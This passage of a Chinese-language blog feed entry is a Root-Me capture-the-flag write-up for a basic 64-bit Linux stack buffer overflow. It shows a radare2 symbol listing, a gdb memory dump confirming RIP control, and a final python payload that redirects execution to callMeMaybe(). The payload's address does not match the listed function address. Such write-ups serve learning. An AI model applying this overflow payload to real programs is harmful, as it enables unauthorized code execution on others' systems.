href="http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf">http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%2064%20Bits%20Linux%20Stack%20Based%20Buffer%20Overflow.pdf</a><br>根据这篇文章<br>通过溢出来控制RIP，将其指向我们想要的函数</p><ol><li>先向buffer中输入字符，执行到<code>ret</code>时，查看<code>RSP</code>的值，确定需要多少位可以溢出到<code>RSP</code>位</li><li>可以确定需要<code>0x110</code> 即<code>280</code>位，之后添加的字符就会输入进<code>RIP</code>中</li><li>我们需要的是执行<code>callMeMaybe()</code>，所以将函数地址倒序添加进末尾（因为小端序）</li></ol><hr><h3 id="查看函数地址"><a href="#查看函数地址" class="headerlink" title="查看函数地址"></a>查看函数地址</h3><pre><code>[0x00401193]&gt; fs symbols;f0x00401000 23 sym._init0x00401070 42 entry00x00401070 43 sym._start0x004010a0 1 sym._dl_relocate_static_pie0x004010b0 33 sym.deregister_tm_clones0x004010e0 49 sym.register_tm_clones0x00401120 33 entry.fini00x00401120 0 sym.__do_global_dtors_aux0x00401150 2 entry.init00x00401150 0 sym.frame_dummy0x00401152 65 sym.callMeMaybe0x00401193 103 main0x00401193 103 sym.main</code></pre><h3 id="“a”-280-”B”-6"><a href="#“a”-280-”B”-6" class="headerlink" title="“a”*280+”B”*6"></a>“a”*280+”B”*6</h3><pre><code>gdb-peda$ x/290xb $rbp-0x1100x7fffffffdb80:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdb88:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdb90:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdb98:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdba0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdba8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbb0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbb8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbc0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbc8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbd0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbd8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbe0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbe8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbf0:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdbf8:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc00:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc08:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc10:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc18:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc20:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc28:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc30:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc38:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc40:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc48:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc50:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc58:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc60:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc68:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc70:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc78:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc80:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc88:    0x61    0x61    0x61    0x61    0x1e    0x01    0x00    0x000x7fffffffdc90:    0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x610x7fffffffdc98:    0x42    0x42    0x42    0x42    0x42    0x42    0x00    0x000x7fffffffdca0:    0x88    0xdd</code></pre><hr><p>成功控制RIP<br>RSP: 0x7fffffffdc98 –&gt; 0x424242424242 (‘BBBBBB’)<br>Invalid $PC address: 0x424242424242</p><p>最后的payload:<br><code>(python -c &#39;print &quot;A&quot; * 280  + &quot;\xe7\x05\x40\x00\x00\x00\x00\x00&quot;&#39; ; cat ) | ./ch35</code></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x64-Stack-buffer-overflow-basic&quot;&gt;&lt;a href=&quot;#ELF-x64-Stack-buffer-overflow-basic&quot; class=&quot;headerlink&quot; title=&quot;ELF x64 - Stack buffer overflow - basic&quot;&gt;&lt;/a&gt;ELF x64 - Stack buffer overflow - basic&lt;/h2&gt;&lt;p&gt;&lt;em&gt;gdb 内 查看函数&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;info functions&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x0000000000401152  callMeMaybe
0x0000000000401193  main&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
</feed>
